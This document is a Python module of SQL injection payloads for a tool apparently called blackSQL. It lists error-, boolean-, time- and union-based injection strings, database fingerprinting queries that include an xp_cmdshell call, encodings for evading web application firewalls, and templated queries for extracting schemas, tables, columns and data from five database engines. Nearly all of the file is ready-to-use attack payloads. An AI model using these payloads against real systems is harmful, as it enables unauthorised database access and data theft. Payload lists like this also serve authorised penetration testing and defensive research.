#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
SQL injection payloads for blackSQL
"""

# Error-based SQL injection payloads
ERROR_BASED = [
    "'",
    "\"",
    "' OR '1'='1",
    "\" OR \"1\"=\"1",
    "' OR '1'='1' --",
    "\" OR \"1\"=\"1\" --",
    "' OR 1=1 --",
    "\" OR 1=1 --",
    "' OR 1=1#",
    "\" OR 1=1#",
    "1' OR '1'='1",
    "1\" OR \"1\"=\"1",
    "' OR 'x'='x",
    "\" OR \"x\"=\"x",
    "') OR ('x'='x",
    "\") OR (\"x\"=\"x",
    "' OR 1=1 LIMIT 1#",
    "\" OR 1=1 LIMIT 1#",
    "' OR 1=1 LIMIT 1 --",
    "\" OR 1=1 LIMIT 1 --",
    "' OR '1'='1' LIMIT 1 --",
    "' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20 --",
    "1' ORDER BY 10--+",
    "1' ORDER BY 5--+",
    "1' GROUP BY 1,2,--+",
    "' GROUP BY columnnames having 1=1 --",
    "-1' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20 --",
    "' AND (SELECT 1 FROM (SELECT COUNT(*),concat(0x7e,(SELECT version()),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) AND '1'='1",
    "' AND (SELECT 1 FROM (SELECT COUNT(*),concat(0x7e,(SELECT user()),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) AND '1'='1",
    "' AND (SELECT 1 FROM (SELECT COUNT(*),concat(0x7e,(SELECT database()),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) AND '1'='1",
    "' AND (SELECT 1 FROM (SELECT COUNT(*),concat(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) AND '1'='1",
]

# Boolean-based SQL injection payloads
BOOLEAN_BASED = [
    "' AND 1=1 --",
    "' AND 1=0 --",
    "' OR 1=1 --",
    "' OR 1=0 --",
    "\" AND 1=1 --",
    "\" AND 1=0 --",
    "\" OR 1=1 --",
    "\" OR 1=0 --",
    "' AND '1'='1",
    "' AND '1'='0",
    "\" AND \"1\"=\"1",
    "\" AND \"1\"=\"0",
    "1' AND 1=(SELECT COUNT(*) FROM tablenames); --",
    "1' AND 1=(SELECT 0); --",
    "1' OR 1=(SELECT 0); --",
    "1' OR 1=(SELECT COUNT(*) FROM tablenames); --",
    "1 AND (SELECT 1 FROM dual WHERE 1=1)='1'",
    "1 AND (SELECT 1 FROM dual WHERE 1=0)='1'",
    "1' AND 1=(SELECT COUNT(1) FROM (SELECT 1 UNION SELECT 2)x); --",
    "1' OR 1=(SELECT COUNT(1) FROM (SELECT 1 UNION SELECT 2)x); --"
]

# Time-based SQL injection payloads
TIME_BASED = [
    "' AND SLEEP(5) --",
    "\" AND SLEEP(5) --",
    "' OR SLEEP(5) --",
    "\" OR SLEEP(5) --",
    "' AND (SELECT * FROM (SELECT(SLEEP(5)))a) --",
    "\" AND (SELECT * FROM (SELECT(SLEEP(5)))a) --",
    "' OR (SELECT * FROM (SELECT(SLEEP(5)))a) --",
    "\" OR (SELECT * FROM (SELECT(SLEEP(5)))a) --",
    "'; WAITFOR DELAY '0:0:5' --",
    "\"; WAITFOR DELAY '0:0:5' --",
    "' OR WAITFOR DELAY '0:0:5' --",
    "\" OR WAITFOR DELAY '0:0:5' --",
    "1' AND (SELECT 1 FROM PG_SLEEP(5)) --",
    "1' AND SLEEP(5) AND '1'='1",
    "1' OR SLEEP(5) AND '1'='1",
    "' SELECT pg_sleep(5) --",
    "1) OR pg_sleep(5)--",
    "' WAITFOR DELAY '0:0:5'--"
]

# Union-based SQL injection payloads
UNION_BASED = [
    "' UNION SELECT NULL --",
    "' UNION SELECT NULL,NULL --",
    "' UNION SELECT NULL,NULL,NULL --",
    "' UNION SELECT NULL,NULL,NULL,NULL --",
    "' UNION SELECT NULL,NULL,NULL,NULL,NULL --",
    "' UNION SELECT BANNER,NULL,NULL,NULL,NULL FROM v$version --",
    "' UNION SELECT @@version,NULL,NULL,NULL,NULL --",
    "' UNION SELECT version(),NULL,NULL,NULL,NULL --",
    "' UNION SELECT 1,2,3,4,5 --",
    "' UNION SELECT 1,2,3,4,5,6 --",
    "' UNION SELECT 1,2,3,4,5,6,7 --",
    "' UNION SELECT 1,2,3,4,5,6,7,8 --",
    "' UNION SELECT 1,2,3,4,5,6,7,8,9 --",
    "' UNION SELECT 1,2,3,4,5,6,7,8,9,10 --",
    "' UNION ALL SELECT 1,2,3,4,5 --",
    "' UNION ALL SELECT 1,2,3,4,5,6 --",
    "' UNION ALL SELECT 1,2,3,4,5,6,7 --",
    "' UNION ALL SELECT 1,2,3,4,5,6,7,8 --",
    "' UNION ALL SELECT 1,2,3,4,5,6,7,8,9 --",
    "' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10 --"
]

# Database fingerprint payloads
DB_FINGERPRINT = {
    'mysql': [
        "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a) AND '1'='1",
        "' UNION SELECT @@version,NULL,NULL --",
        "' AND @@version --",
        "' AND CONVERT(@@version USING utf8) --"
    ],
    'mssql': [
        "' AND (SELECT CAST(@@version AS VARCHAR(8000))) --",
        "' UNION SELECT @@version,NULL,NULL --",
        "'; EXEC master..xp_cmdshell 'ping 127.0.0.1' --",
        "'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; --"
    ],
    'postgres': [
        "' AND (SELECT version()) --",
        "' UNION SELECT version(),NULL,NULL --",
        "'; SELECT pg_sleep(5) --",
        "' AND CAST(version() AS VARCHAR) --"
    ],
    'oracle': [
        "' AND (SELECT BANNER FROM v$version WHERE ROWNUM=1) --",
        "' UNION SELECT BANNER,NULL,NULL FROM v$version --",
        "' AND INSTRB(UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||SUBSTR(BANNER,1,7)||CHR(113)||CHR(62))),CHR(60)||CHR(58)||CHR(113))>0 FROM v$version --",
        "' AND SYS.DATABASE_NAME IS NOT NULL --"
    ],
    'sqlite': [
        "' AND sqlite_version() IS NOT NULL --",
        "' UNION SELECT sqlite_version(),NULL,NULL --",
        "' AND TYPEOF(sqlite_version()) --",
        "' AND LIKE('%%',sqlite_version()) --"
    ]
}

# WAF bypass techniques
WAF_BYPASS = [
    # Comment variants
    "/**/",
    "/*!50000*/",
    "#",
    "--",
    "-- -",
    ";--",
    "; -- -",
    "/*! */",

    # Case alternation
    "SeLeCt",
    "uNiOn",
    "WheRe",

    # Whitespace alternatives
    "%09",  # Tab
    "%0A",  # New line
    "%0C",  # Form feed
    "%0D",  # Carriage return
    "%A0",  # Non-breaking space

    # URL encoding
    "%2527",  # Single quote
    "%252F",  # /
    "%2520",  # Space

    # Double URL encoding
    "%252527",  # Single quote
    "%25252F",  # /
    "%252520",  # Space

    # Character replacement
    "CONCAT(CHAR(83),CHAR(69),CHAR(76),CHAR(69),CHAR(67),CHAR(84))",  # SELECT
    "CHAR(83)+CHAR(69)+CHAR(76)+CHAR(69)+CHAR(67)+CHAR(84)",
    "CHAR(83)||CHAR(69)||CHAR(76)||CHAR(69)||CHAR(67)||CHAR(84)",

    # Null byte injection
    "%00",
    "\\0",

    # Logic alternatives
    " OR 2>1",
    " || 1=1",
    " && 1=1",

    # Comments in the middle
    "SEL/**/ECT",
    "SEL%09ECT",
    "S%0AELECT",
    "SELEC/*FOOBAR*/T"
]

# Extraction payloads for MySQL
MYSQL_EXTRACT = {
    'databases': [
        # Database names
        "' UNION SELECT schema_name,NULL,NULL FROM information_schema.schemata --",
        "' UNION SELECT GROUP_CONCAT(schema_name),NULL,NULL FROM information_schema.schemata --",
    ],
    'tables': [
        # Get tables from current database
        "' UNION SELECT table_name,NULL,NULL FROM information_schema.tables WHERE table_schema=DATABASE() --",
        "' UNION SELECT GROUP_CONCAT(table_name),NULL,NULL FROM information_schema.tables WHERE table_schema=DATABASE() --",
        # Get tables from specific database
        "' UNION SELECT table_name,NULL,NULL FROM information_schema.tables WHERE table_schema='{}' --",
        "' UNION SELECT GROUP_CONCAT(table_name),NULL,NULL FROM information_schema.tables WHERE table_schema='{}' --",
    ],
    'columns': [
        # Get columns from a table
        "' UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='{}' --",
        "' UNION SELECT GROUP_CONCAT(column_name),NULL,NULL FROM information_schema.columns WHERE table_name='{}' --",
    ],
    'data': [
        # Get data from columns
        "' UNION SELECT {0},NULL,NULL FROM {1} --",
        "' UNION SELECT GROUP_CONCAT({0}),NULL,NULL FROM {1} --",
    ]
}

# Extraction payloads for MSSQL
MSSQL_EXTRACT = {
    'databases': [
        # Database names
        "' UNION SELECT name,NULL,NULL FROM master..sysdatabases --",
        "' UNION SELECT DB_NAME(0),NULL,NULL --",
        "' UNION SELECT DB_NAME(1),NULL,NULL --",
    ],
    'tables': [
        # Get tables from current database
        "' UNION SELECT name,NULL,NULL FROM sysobjects WHERE xtype='U' --",
        # Get tables from specific database
        "' UNION SELECT name,NULL,NULL FROM {0}..sysobjects WHERE xtype='U' --",
    ],
    'columns': [
        # Get columns from a table
        "' UNION SELECT name,NULL,NULL FROM syscolumns WHERE id=OBJECT_ID('{}') --",
    ],
    'data': [
        # Get data from columns
        "' UNION SELECT {0},NULL,NULL FROM {1} --",
    ]
}

# Extraction payloads for PostgreSQL
POSTGRES_EXTRACT = {
    'databases': [
        # Database names
        "' UNION SELECT datname,NULL,NULL FROM pg_database --",
    ],
    'tables': [
        # Get tables from current database
        "' UNION SELECT table_name,NULL,NULL FROM information_schema.tables WHERE table_schema='public' --",
        # Get tables from specific database
        "' UNION SELECT tablename,NULL,NULL FROM pg_tables WHERE schemaname='public' --",
    ],
    'columns': [
        # Get columns from a table
        "' UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='{}' --",
    ],
    'data': [
        # Get data from columns
        "' UNION SELECT {0},NULL,NULL FROM {1} --",
    ]
}

# Extraction payloads for Oracle
ORACLE_EXTRACT = {
    'databases': [
        # There are no multiple databases in Oracle, only schemas
        "' UNION SELECT owner,NULL,NULL FROM all_tables --",
    ],
    'tables': [
        # Get tables from current schema
        "' UNION SELECT table_name,NULL,NULL FROM all_tables WHERE owner=USER --",
        # Get tables from specific schema
        "' UNION SELECT table_name,NULL,NULL FROM all_tables WHERE owner='{}' --",
    ],
    'columns': [
        # Get columns from a table
        "' UNION SELECT column_name,NULL,NULL FROM all_tab_columns WHERE table_name='{}' --",
    ],
    'data': [
        # Get data from columns
        "' UNION SELECT {0},NULL,NULL FROM {1} --",
    ]
}

# Extraction payloads for SQLite
SQLITE_EXTRACT = {
    'databases': [
        # SQLite has no concept of multiple databases
        "' UNION SELECT 'main',NULL,NULL --",
    ],
    'tables': [
        # Get tables
        "' UNION SELECT name,NULL,NULL FROM sqlite_master WHERE type='table' --",
    ],
    'columns': [
        # Get columns from a table
        "' UNION SELECT sql,NULL,NULL FROM sqlite_master WHERE type='table' AND name='{}' --",
    ],
    'data': [
        # Get data from columns
        "' UNION SELECT {0},NULL,NULL FROM {1} --",
    ]
}

# Collection of extraction payloads by database type
EXTRACTION_PAYLOADS = {
    'mysql': MYSQL_EXTRACT,
    'mssql': MSSQL_EXTRACT,
    'postgres': POSTGRES_EXTRACT,
    'oracle': ORACLE_EXTRACT,
    'sqlite': SQLITE_EXTRACT
}
